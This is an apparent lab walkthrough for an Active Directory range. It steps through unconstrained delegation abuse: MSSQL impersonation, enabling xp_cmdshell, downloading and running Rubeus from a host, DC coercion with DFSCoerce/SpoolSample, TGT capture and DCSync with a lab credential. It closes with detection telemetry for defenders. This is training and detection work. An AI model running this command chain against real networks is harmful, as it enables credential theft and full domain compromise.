# WT#004 — Unconstrained Delegation

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | 192.168.77.22 (mbr01) |
| **Domain** | child.cadre.local |
| **Starting Credential** | analyst_t1 / T13r_An@lyst! (via MSSQL) |
| **Tools Required** | impacket-mssqlclient, Rubeus, SpoolSample/DFSCoerce |
| **Certifications** | CRTP, CRTE |
| **MITRE ATT&CK** | T1550.003 |
| **Difficulty** | Medium |

## Prerequisites
- MSSQL on mbr01 accessible from kali (port 1433)
- analyst_t1 has IMPERSONATE on sa login
- xp_cmdshell enabled on mbr01 MSSQL instance
- mbr01$ has `TrustedForDelegation = $true`

## Attack Steps

### Step 1 — Connect to MSSQL and impersonate sa
```bash
# Connect as analyst_t1 via Windows auth
impacket-mssqlclient CHILD/analyst_t1:'T13r_An@lyst!'@192.168.77.22 -windows-auth

# Impersonate sa
EXECUTE AS LOGIN = 'sa';

# Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

### Step 2 — Upload and run Rubeus to verify delegation
```bash
# From xp_cmdshell, download and execute Rubeus
xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://192.168.77.41/Rubeus.exe -OutFile C:\Windows\Temp\Rubeus.exe"';

# Check delegation status of mbr01$
xp_cmdshell 'C:\Windows\Temp\Rubeus.exe checkdelegation /domain:child.cadre.local';
```

### Step 3 — Coerce dc02 to authenticate to mbr01
```bash
# From kali, run DFSCoerce against dc02, targeting mbr01
python3 DFSCoerce.py -d child.cadre.local -u analyst_t1 -p 'T13r_An@lyst!' listener=192.168.77.22 target=192.168.77.11

# Alternative: SpoolSample (if Print Spooler running on dc02)
python3 SpoolSample.py child.cadre.local/analyst_t1:'T13r_An@lyst!'@192.168.77.11 192.168.77.22
```

### Step 4 — Capture dc02$ TGT on mbr01
```bash
# From xp_cmdshell, monitor for incoming TGT in Kerberos cache
xp_cmdshell 'C:\Windows\Temp\Rubeus.exe monitor /interval:5 /domain:child.cadre.local';

# After coercion triggers, Rubeus captures dc02$ TGT
# Output includes base64-encoded .kirbi ticket
```

### Step 5 — Inject TGT and DCSync
```bash
# From kali, receive the base64 TGT from Rubeus output
# Write to file and convert to kirbi, then inject

# Use impacket to pass the ticket
export KRB5CCNAME=/tmp/dc02.ccache

# Convert kirbi to ccache
impacket-ticketConverter /tmp/dc02.kirbi /tmp/dc02.ccache

# DCSync as dc02$ (which has DC replication rights in child domain)
impacket-secretsdump -k -no-pass dc02$@dc02.child.cadre.local
```

## Post-Exploitation Chain
WT#004 (Unconstrained Delegation) → dc02$ machine hash → DCSync child domain → Golden/Silver Ticket → full child domain compromise → trust attack to cadre.local

## Telemetry Verification
- **Elastic Index:** `logs-system.security-*`, `logs-windows.sysmon_operational-*`
- **Expected Events:**
  - Event ID 4662: Audit of msDS-AllowedToActOnBehalfOfOtherIdentity
  - Event ID 4624: Logon with Kerberos (delegation token)
  - Sysmon EID 1: Rubeus.exe process creation
  - Sysmon EID 3: Network connections from mbr01 to dc02
- **Zeek:** `kerberos.log` showing TGT requests with delegation flags set
- **Suricata:** Potential alert on DFSCoerce/RPC abuse
- **Defender view:** two correlated signals — a **coercion RPC** (DFSCoerce/PetitPotam/SpoolSample) hitting a DC, immediately followed by that **DC's machine account (dc02$) authenticating to mbr01** with a forwardable TGT. A DC logging on to a member server is itself anomalous; pair it with the coercion call and it's unconstrained-delegation abuse.

**Alternative paths:** if Print Spooler is off, swap SpoolSample for DFSCoerce or PetitPotam (EFS); or capture a *user's* TGT instead of the DC's for a quieter foothold before escalating.

## Status
CONFIGURED
